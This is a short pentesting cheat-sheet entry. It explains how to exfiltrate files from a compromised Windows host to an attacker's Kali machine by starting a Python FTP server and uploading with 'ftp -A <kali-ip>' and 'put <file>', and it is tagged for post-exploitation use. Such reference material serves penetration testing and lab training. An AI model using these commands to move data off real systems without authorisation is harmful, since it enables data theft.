---
title: |
  File Transfers - Windows to Linux - FTP
description: |
  (Linux) Setup ftp:

  	python -m pyftpdlib -p 21

  (Windows) Connect to ftp:

  	ftp -A <kali-ip>

  (Windows) Copy file to ftp server

  	put <file>

command: |
  See commands.
items:
  - Shell
  - Username
  - Password
OS:
  - Windows
  - Linux
attack_types:
  - Enumeration
  - PrivEsc
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
  - https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/
---
